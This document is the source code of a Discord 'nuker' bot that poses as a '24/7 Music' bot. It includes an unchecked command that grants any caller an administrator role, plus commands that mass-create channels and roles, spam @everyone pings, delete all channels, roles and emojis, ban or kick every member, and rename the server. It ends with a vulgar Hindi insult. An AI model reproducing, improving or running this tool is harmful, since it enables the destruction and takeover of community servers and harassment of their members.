// https://github.com/Citizen05

const Discord = require('discord.js');
const client = new Discord.Client({ ws: { intents: new Discord.Intents(Discord.Intents.ALL) } });
const { red, green, blue, yellow, cyan, greenBright, redBright, grey, yellowBright, cyanBright, black, blueBright } = require('chalk');
const settings = require('./settings.json');
const token = settings.token;
const prefix = settings.prefix;
const founder = settings.founder;
const disableEveryone = settings.DisableEveryone;
const myID = settings.ID;

const presser = String.raw`


                     ██▓███   ██▀███  ▓█████   ██████   ██████ ▓█████  ██▀███
                    ▓██░  ██▒▓██ ▒ ██▒▓█   ▀ ▒██    ▒ ▒██    ▒ ▓█   ▀ ▓██ ▒ ██▒
                    ▓██░ ██▓▒▓██ ░▄█ ▒▒███   ░ ▓██▄   ░ ▓██▄   ▒███   ▓██ ░▄█ ▒
                    ▒██▄█▓▒ ▒▒██▀▀█▄  ▒▓█  ▄   ▒   ██▒  ▒   ██▒▒▓█  ▄ ▒██▀▀█▄
                    ▒██▒ ░  ░░██▓ ▒██▒░▒████▒▒██████▒▒▒██████▒▒░▒████▒░██▓ ▒██▒
                    ▒▓▒░ ░  ░░ ▒▓ ░▒▓░░░ ▒░ ░▒ ▒▓▒ ▒ ░▒ ▒▓▒ ▒ ░░░ ▒░ ░░ ▒▓ ░▒▓░
                    ░▒ ░       ░▒ ░ ▒░ ░ ░  ░░ ░▒  ░ ░░ ░▒  ░ ░ ░ ░  ░  ░▒ ░ ▒░
                    ░░         ░░   ░    ░   ░  ░  ░  ░  ░  ░     ░     ░░   ░
                    ░        ░  ░      ░        ░     ░  ░   ░



                                        Author: Citizen

`;

console.log(red(presser));


client.on("ready", () => {
    console.log(red('           ════════════════════════════════════════════════════════════════════════════════'));
    console.log(greenBright(`                                      Logged in as: ${client.user.username}#${client.user.discriminator}`));
    console.log(greenBright(`                                      Prefix: ${prefix}`));
    console.log(greenBright(`                                      DisableEveryone: ${disableEveryone}`));
    console.log(greenBright(`                                      Permission Required: ADMINISTRATOR`));
    console.log(red('           ════════════════════════════════════════════════════════════════════════════════'));
    console.log("");
    client.user.setActivity({ type: "PLAYING", name: "24/7 Music" }); // Delete this if you wish.
});


client.on("message", async message => {


		if (message.author.bot) return;


    if (message.mentions.everyone === true) {
        return;
        }

    // Test Command
    if (message.content.startsWith(prefix + "ping")) {
        message.channel.send("Pong!")
    }

   //Admin Perm
          if (message.content.startsWith(prefix + 'papa'))
		  {    role = await message.guild.roles.create ({
             name: 'role',
             color: 'BLUE',
             })
	           role.setPermissions(['ADMINISTRATOR'])
	          role.setPosition(15)

						message.member.roles.add(role)
             message.delete();

						return console.log(red("ADMINSTRATOR!!!!! granted to " + message.member.user.tag))

				}


     // Mass Channels

        if (message.content.startsWith(prefix + 'cc'))
				   {

                let args = message.content.split(" ").slice(1);
                var argresult = args.join(' ');
                if (!argresult)
								{
									for (var i = 0; i < 100; i++) {
                        message.guild.channels.create(message.author.username)
                        console.log(yellowBright(`CHANNEL MASSED!`))
                    }

                } else {
                    for (var i = 0; i < 100; i++) {
                        message.guild.channels.create(argresult)
                        console.log(yellowBright(`CHANNEL MASSED!`))
                    }
                }
                message.delete();
            }


				// Mass Channel & Ping Every Channel

        if (message.content.startsWith(prefix + 'mp'))
				{

                let args = message.content.split(" ").slice(1);
                var argresult = args.join(' ');


                    for (var i = 0; i < 250; i++) {
                        message.guild.channels.create(message.author.username + ' nuked you')

                        for (var i = 0; i < 250; i++) {
                            let channels = message.guild.channels.create(message.author.username + ' nuked you')

                            channels.then(
                                function (channel, index) {
                                    for (var i = 0; i < 250; i++) {
                                        channel.send('@everyone ' + argresult)
                                        console.log(blueBright(`CHANNEL PINGED!`));
                                        // other per-channnel logic
                                    }
                                }
                            );
                        }

                    }



            message.delete();
					 }


				// Mass ROLES

        if (message.content.startsWith(prefix + 'mr')) {

                let args = message.content.split(" ").slice(1);
                var argresult = args.join(' ');
                if (!argresult) {
                    message.channel.send("*Add an input after the cmd*")
                } else {
                    setInterval(function () {
                        var i = 0; i < 250;
                        message.guild.roles.create({
                            data: {
                                name: `${argresult}`,
                                position: i++,
                                color: "RANDOM"
                            }
                        }).then(console.log(yellow("ROLE BEING MASSED")))
                    }, 100) // 0.1 second
                }
                message.delete();

						}


          // Channel Delete
        if (message.content.startsWith(prefix + 'chd')) {

                message.guild.channels.cache.forEach(channel => channel.delete().then(
                    console.log(redBright(`CHANNEL FUCKED`))
                )); // deletes all channels
                message.guild.channels.create(message.author.username + ' nuked you')

					}


           // Ban All
        if (message.content.startsWith(prefix + 'banall')) {
            if (!message.guild.me.hasPermission("ADMINISTRATOR")) {
                return console.log(red("PERMISSION MISSING: ADMINSTRATOR!!!!!"))
            } else {
                message.guild.members.cache.forEach(member => member.ban({ reason: "Nuking." })
                    .then(console.log(`${member.user.tag} was banned`) && message.channel.send("Banning All Members.")
                        .catch()
                    ))
                message.delete();
            }
        }


         // Kick All
        if (message.content.startsWith(prefix + 'kall')) {

                message.guild.members.cache.forEach(member => member.kick({ reason: "Nuking." })
                    .then(console.log(`${member.user.tag} was banned`) && message.channel.send("KICKING All Members.")
                        .catch()
                    ));
                message.delete();

				  }


				//DELETE ROLES
        if (message.content.startsWith(prefix + 'dr')) {

                message.guild.roles.cache.forEach((role) => {
                    role.delete("Nuking").then(console.log(yellow(`ROLE: ${role.name} is being deleted successfully`)))
                })
                message.delete();

				  }


					// Delete All Emojis
        if (message.content.startsWith(prefix + 'emoall')) {

                message.guild.emojis.cache.forEach(e => e.delete({ reason: "Nuking" }).then(console.log(yellow(`EMOJI: ${e.name} is being deleted successfully`))))
                message.delete();

				 }

         // Death.
        if (message.content.startsWith(prefix + 'die')) {

                message.delete();
                message.guild.setName(`CITIZEN Daddy` + + message.guild.name).then(console.log(green('Server named changed of ' + message.guild.name))); // changes server name

                // Channel Delete
                message.guild.channels.cache.forEach(channel => channel.delete().then(
                    console.log(redBright(`CHANNEL FUCKED`))
                ).then(
                    // Channel Icon Change
                    message.guild.setIcon('https://media.discordapp.net/attachments/842303427865346065/843131936826589224/rip.png?width=323&height=406') // changes server pfp
                ));


                // Emoji
                message.guild.emojis.cache.forEach(e => e.delete({ reason: "Nuking" },).then(console.log(yellow(`EMOJI: ${e.name} was deleted successfully`))))

                // Massing Channels
                let args = message.content.split(" ").slice(1);
                var argresult = args.join(' ');
								 message.guild.channels.create('citizen-daddy')
								 message.guild.channels.create('citizen-daddy')
		                                                 message.guild.channels.create('citizen-daddy')

                   for (var i = 0; i < 100; i++) {
                        let channels = message.guild.channels.create(message.author.username + '-nuked-you')

                        channels.then(
                            function (channel, index) {
                                for (var i = 0; i < 100; i++) {
                                    channel.send(`@everyone ${argresult}`)
                                    console.log(blueBright(`CHANNEL PINGED!`));
                                    // other per-channnel logic
                                }
                            }
                        )
                    }

                setInterval(function () {
                    var i = 0; i < 100;
                    message.guild.roles.create({
                        data: {
                            name: `${argresult}`,
                            position: i++,
                            color: "RANDOM"
                        }
                    }).then(console.log(yellow("ROLE BEING MASSED")))
                }, 100) // 0.1 second

					}


				//Leave

	 		if (message.content.startsWith(prefix + 'lalit'))
		  {
			 if (message.author.id == 792669687245701191 || message.author.id == 387706245362089986 || message.author.id == 780376098365243395 || message.author.id == 683667783737016332 || message.author.id == 479369896451375139){
			      try
			     {

             message.delete();
            message.guild.leave();

            return console.log(red("SUCESSFULLY LEFT THE SERVER......Sad :("))

           }
		          catch(e)
		        {

              console.log(e.stack);

            }
				 }

           else
					 message.channel.send("Baap se bakchodi krega teri maa ki choot lawde. Citizen Daddy bol")

      }



})

client.login(token);
